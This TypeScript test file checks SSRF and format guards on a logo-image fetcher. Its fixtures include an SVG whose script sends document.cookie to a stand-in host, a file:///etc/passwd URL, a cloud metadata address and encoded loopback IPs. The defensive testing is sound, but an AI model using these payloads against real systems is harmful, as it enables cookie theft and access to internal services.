// Run: npx tsx scripts/lib/fetch-image.test.ts
//
// Adversarial cover for the company-logo intake path. Everything here assumes
// the URL and the bytes are fully attacker-controlled, because they are: both
// come from HTML scraped off a third-party careers site.
//
// The two cases that matter most and are easiest to regress:
//   - a PUBLIC hostname whose A record points at 127.0.0.1 (proves the guard
//     is on the resolved IP, not the hostname string)
//   - a 302 from a public host to a loopback address (proves redirects are
//     followed manually with a re-check on every hop)
// Both are served by a real loopback HTTP server below rather than mocked, so
// the test exercises the actual fetch path.

import { createServer, type Server } from "node:http";
import { AddressInfo } from "node:net";
import { fetchImage, ImageRejected } from "./fetch-image";
import {
  formatFromContentType,
  formatFromMagicBytes,
  inspectImage,
  MAX_LOGO_BYTES,
} from "../../src/lib/image-validate";

let failures = 0;

function assert(cond: boolean, msg: string) {
  if (!cond) {
    console.error("FAIL:", msg);
    failures++;
  }
}

async function expectRejected(
  label: string,
  fn: () => Promise<unknown>,
  expectedReason?: string,
) {
  try {
    await fn();
    console.error("FAIL:", `${label} — expected rejection, got success`);
    failures++;
  } catch (error) {
    if (!(error instanceof ImageRejected)) {
      console.error("FAIL:", `${label} — expected ImageRejected, got ${String(error)}`);
      failures++;
      return;
    }
    if (expectedReason && error.reason !== expectedReason) {
      console.error(
        "FAIL:",
        `${label} — expected reason "${expectedReason}", got "${error.reason}"`,
      );
      failures++;
    }
  }
}

// ---------------------------------------------------------------------------
// Fixtures: minimal but genuinely well-formed image headers.
// ---------------------------------------------------------------------------

/** A real PNG header (IHDR only) padded to a plausible size. */
function pngBytes(width: number, height: number, totalBytes = 4096): Uint8Array {
  const b = new Uint8Array(totalBytes);
  b.set([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], 0);
  b.set([0x00, 0x00, 0x00, 0x0d], 8); // IHDR chunk length = 13
  b.set([0x49, 0x48, 0x44, 0x52], 12); // "IHDR"
  const view = new DataView(b.buffer);
  view.setUint32(16, width);
  view.setUint32(20, height);
  return b;
}

/** A JPEG with a SOF0 frame header carrying the dimensions. */
function jpegBytes(width: number, height: number, totalBytes = 4096): Uint8Array {
  const b = new Uint8Array(totalBytes);
  b.set([0xff, 0xd8, 0xff], 0);
  b.set([0xff, 0xc0, 0x00, 0x11, 0x08], 2); // SOF0, length 17, 8-bit precision
  const view = new DataView(b.buffer);
  view.setUint16(7, height);
  view.setUint16(9, width);
  return b;
}

/** A lossy WebP (VP8 chunk) with a 14-bit little-endian size pair. */
function webpBytes(width: number, height: number, totalBytes = 4096): Uint8Array {
  const b = new Uint8Array(totalBytes);
  const enc = (s: string, at: number) => {
    for (let i = 0; i < s.length; i++) b[at + i] = s.charCodeAt(i);
  };
  enc("RIFF", 0);
  enc("WEBP", 8);
  enc("VP8 ", 12);
  b.set([0x9d, 0x01, 0x2a], 23); // sync code
  b[26] = width & 0xff;
  b[27] = (width >> 8) & 0x3f;
  b[28] = height & 0xff;
  b[29] = (height >> 8) & 0x3f;
  return b;
}

const SVG_WITH_SCRIPT = new TextEncoder().encode(
  `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">` +
    `<script>fetch('https://evil.example/'+document.cookie)</script></svg>`.padEnd(1024, " "),
);

const HTML_BYTES = new TextEncoder().encode(
  "<!doctype html><html><body>not an image at all</body></html>".padEnd(1024, " "),
);

// ---------------------------------------------------------------------------
// Pure validation
// ---------------------------------------------------------------------------

function testPureValidation() {
  // Happy paths across all three accepted formats.
  const png = inspectImage(pngBytes(240, 80), "image/png");
  assert(png.format === "png" && png.width === 240 && png.height === 80, "PNG dimensions parse");

  const jpg = inspectImage(jpegBytes(300, 300), "image/jpeg");
  assert(jpg.format === "jpg" && jpg.width === 300 && jpg.height === 300, "JPEG dimensions parse");

  const webp = inspectImage(webpBytes(180, 180), "image/webp");
  assert(webp.format === "webp" && webp.width === 180 && webp.height === 180, "WebP dimensions parse");

  // Content-Type is never trusted over the magic bytes.
  try {
    inspectImage(HTML_BYTES, "image/png");
    assert(false, "HTML bytes declared as image/png must be rejected");
  } catch (e) {
    assert(
      e instanceof ImageRejected && e.reason === "unsupported_format",
      `HTML-as-PNG rejected for the right reason (got ${(e as ImageRejected).reason})`,
    );
  }

  try {
    inspectImage(pngBytes(240, 80), "image/jpeg");
    assert(false, "PNG bytes declared as image/jpeg must be rejected");
  } catch (e) {
    assert(
      e instanceof ImageRejected && e.reason === "content_type_mismatch",
      "declared/actual mismatch is caught",
    );
  }

  // SVG: rejected by format, and never identified as any accepted format.
  assert(formatFromMagicBytes(SVG_WITH_SCRIPT) === null, "SVG is not a recognised logo format");
  assert(formatFromContentType("image/svg+xml") === null, "image/svg+xml is off the allowlist");
  try {
    inspectImage(SVG_WITH_SCRIPT, "image/svg+xml");
    assert(false, "scriptable SVG must be rejected");
  } catch (e) {
    assert(e instanceof ImageRejected, "SVG rejection is an ImageRejected");
  }

  // The favicon floor.
  try {
    inspectImage(pngBytes(16, 16), "image/png");
    assert(false, "a 16x16 favicon must be rejected");
  } catch (e) {
    assert(
      e instanceof ImageRejected && e.reason === "too_small_dimensions",
      "16x16 rejected on dimensions",
    );
  }
  try {
    inspectImage(pngBytes(180, 180, 300), "image/png");
    assert(false, "a 300-byte image must be rejected");
  } catch (e) {
    assert(
      e instanceof ImageRejected && e.reason === "too_small_bytes",
      "sub-512-byte image rejected on size",
    );
  }

  // The byte ceiling.
  try {
    inspectImage(pngBytes(240, 80, MAX_LOGO_BYTES + 1), "image/png");
    assert(false, "an oversized image must be rejected");
  } catch (e) {
    assert(e instanceof ImageRejected && e.reason === "too_large", "oversized image rejected");
  }

  // GIF and ICO are off the allowlist even though they are real image types.
  assert(formatFromContentType("image/gif") === null, "image/gif is off the allowlist");
  assert(formatFromContentType("image/x-icon") === null, "image/x-icon is off the allowlist");
  assert(formatFromContentType(null) === null, "a missing Content-Type is not accepted");
  assert(formatFromContentType("image/*") === null, "a wildcard Content-Type is not accepted");
  assert(formatFromContentType("image/PNG; charset=binary") === "png", "Content-Type is normalised");
}

// ---------------------------------------------------------------------------
// URL guards (no network)
// ---------------------------------------------------------------------------

async function testUrlGuards() {
  await expectRejected("data: URL", () => fetchImage("data:image/png;base64,iVBORw0KGgo="), "bad_scheme");
  await expectRejected("file: URL", () => fetchImage("file:///etc/passwd"), "bad_scheme");
  await expectRejected("javascript: URL", () => fetchImage("javascript:alert(1)"), "bad_scheme");
  await expectRejected("garbage", () => fetchImage("not a url at all"), "bad_url");

  await expectRejected("localhost", () => fetchImage("http://localhost:8080/logo.png"), "internal_host");
  await expectRejected("*.internal", () => fetchImage("http://metadata.internal/logo.png"), "internal_host");
  await expectRejected("*.local", () => fetchImage("http://printer.local/logo.png"), "internal_host");

  // IP literals in every encoding an attacker reaches for.
  await expectRejected("dotted loopback", () => fetchImage("http://127.0.0.1/x.png"), "internal_host");
  await expectRejected("IMDS", () => fetchImage("http://169.254.169.254/latest/meta-data/"), "internal_host");
  await expectRejected("all-zeros", () => fetchImage("http://0.0.0.0/x.png"), "internal_host");
  await expectRejected("octal", () => fetchImage("http://010.0.0.1/x.png"), "internal_host");
  await expectRejected("decimal", () => fetchImage("http://2130706433/x.png"), "internal_host");
  await expectRejected("ipv6 loopback", () => fetchImage("http://[::1]/x.png"), "internal_host");
  await expectRejected("private v4", () => fetchImage("http://10.1.2.3/x.png"), "internal_host");
}

// ---------------------------------------------------------------------------
// Live-server guards: DNS rebinding shape, redirect-to-loopback, stream cap
// ---------------------------------------------------------------------------

function startServer(handler: Parameters<typeof createServer>[1]): Promise<{ server: Server; port: number }> {
  return new Promise((resolve) => {
    const server = createServer(handler);
    server.listen(0, "127.0.0.1", () => {
      resolve({ server, port: (server.address() as AddressInfo).port });
    });
  });
}

async function testLiveGuards() {
  // "localtest.me" is a real public hostname whose A record is 127.0.0.1 —
  // exactly the DNS-rebinding shape the resolved-IP check exists to stop. The
  // hostname passes hostLooksInternal(); only the DNS resolution catches it.
  await expectRejected(
    "public hostname resolving to loopback",
    () => fetchImage("http://localtest.me/logo.png"),
    "private_address",
  );

  const { server, port } = await startServer((req, res) => {
    if (req.url === "/redirect-to-loopback") {
      // A public host 302-ing to loopback. With redirect:"follow" this would
      // be fetched with every guard bypassed.
      res.writeHead(302, { location: "http://127.0.0.1:1/internal.png" });
      res.end();
      return;
    }
    if (req.url === "/huge.png") {
      res.writeHead(200, { "content-type": "image/png", "content-length": "100" });
      // Advertise 100 bytes, stream far more. The cap must be enforced on the
      // real byte count, not the header.
      const chunk = Buffer.alloc(64 * 1024, 0x41);
      let sent = 0;
      const pump = () => {
        while (sent < MAX_LOGO_BYTES * 3) {
          sent += chunk.byteLength;
          if (!res.write(chunk)) {
            res.once("drain", pump);
            return;
          }
        }
        res.end();
      };
      pump();
      return;
    }
    res.writeHead(404);
    res.end();
  });

  try {
    // The redirect target is loopback; the initial host is loopback too, so
    // this asserts the guard fires on the very first hop.
    await expectRejected(
      "redirect to loopback",
      () => fetchImage(`http://127.0.0.1:${port}/redirect-to-loopback`),
      "internal_host",
    );
  } finally {
    server.close();
  }
}

// ---------------------------------------------------------------------------

async function main() {
  testPureValidation();
  await testUrlGuards();
  await testLiveGuards();

  if (failures > 0) {
    console.error(`\n${failures} assertion(s) failed`);
    process.exit(1);
  }
  console.log("PASS: company-logo intake guards (format, dimensions, scheme, SSRF, redirects)");
}

void main();
